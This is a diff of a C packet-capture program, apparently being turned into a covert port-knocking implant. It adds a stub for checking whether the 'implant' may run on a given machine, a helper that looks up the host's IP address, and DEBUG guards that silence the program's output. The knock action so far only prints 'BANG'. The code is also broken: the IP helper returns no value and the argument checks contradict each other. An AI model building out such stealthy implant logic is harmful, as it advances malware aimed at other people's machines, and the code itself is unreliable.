@@ -207,6 +207,9 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+#include <netdb.h>
+#include <unistd.h>
+
 /* default snap length (maximum bytes per packet to capture) */
 #define SNAP_LEN 1518
 
@@ -218,6 +221,7 @@
 
 // the target port knocking port
 #define TARGET_PORT 200
+
 
 /* Ethernet header */
 struct sniff_ethernet {
@@ -286,10 +290,42 @@ void
 print_app_usage(void);
 
 
-// function to run when the single port knock occurs
+
+
+// --------------------- M Y  F U N C T I O N S --------------------------
+
+
+// function to run when the port knock occurs
 void port_knock_success(){
 	printf("BANG\n");
 }
+
+
+char* get_ip_addr(){
+		
+	// get host name and IP address of current machine
+	char hostbuffer[256];
+	gethostname(hostbuffer, sizeof(hostbuffer));
+	struct hostent *host_entry = gethostbyname(hostbuffer);
+
+	char * IPbuffer = inet_ntoa(*((struct in_addr*)
+                           host_entry->h_addr_list[0]));
+  
+    // printf("Hostname: %s\n", hostbuffer);
+    // printf("Host IP: %s\n", IPbuffer);
+}
+
+
+// check if we are allowed to run implant on this machine
+void check_env_key(char* ip_addr, FILE* config_file){
+	
+}
+
+
+
+
+// ----------------------------------------------------------------
+
 
 
 
@@ -495,8 +531,10 @@ got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 		return;
 	}
 
-	printf("   Src port: %d\n", ntohs(tcp->th_sport));
-	printf("   Dst port: %d\n", ntohs(tcp->th_dport));
+	#ifdef DEBUG
+		printf("   Src port: %d\n", ntohs(tcp->th_sport));
+		printf("   Dst port: %d\n", ntohs(tcp->th_dport));
+	#endif
 
 #ifdef TARGET_PORT
 	if(ntohs(tcp->th_dport) == TARGET_PORT){
@@ -527,7 +565,6 @@ return;
 
 int main(int argc, char **argv)
 {
-
 	char *dev = NULL;			/* capture device name */
 	char errbuf[PCAP_ERRBUF_SIZE];		/* error buffer */
 	pcap_t *handle;				/* packet capture handle */
@@ -541,14 +578,14 @@ int main(int argc, char **argv)
 	print_app_banner();
 
 	/* check for capture device name on command-line */
-	if (argc == 2) {
+	if (argc == 3) {
 		dev = argv[1];
 	}
 	else if (argc > 2) {
 		fprintf(stderr, "error: unrecognized command-line options\n\n");
 		print_app_usage();
 		#ifdef DEBUG
-			printf("unrecognized command-line options\n");
+			printf("too many arguments\n");
 		#endif
 		exit(EXIT_FAILURE);
 	}
@@ -576,10 +613,12 @@ int main(int argc, char **argv)
 		mask = 0;
 	}
 
-	/* print capture info */
-	printf("Device: %s\n", dev);
-	printf("Number of packets: %d\n", num_packets);
-	printf("Filter expression: %s\n", filter_exp);
+	#ifdef DEBUG
+		/* print capture info */
+		printf("Device: %s\n", dev);
+		printf("Number of packets: %d\n", num_packets);
+		printf("Filter expression: %s\n", filter_exp);
+	#endif
 
 	/* open capture device */
 	handle = pcap_open_live(dev, SNAP_LEN, 1, 1000, errbuf);
@@ -627,7 +666,9 @@ int main(int argc, char **argv)
 	pcap_freecode(&fp);
 	pcap_close(handle);
 
-	printf("\nCapture complete.\n");
+	#ifdef DEBUG
+		printf("\nCapture complete.\n");
+	#endif
 
 return 0;
 }
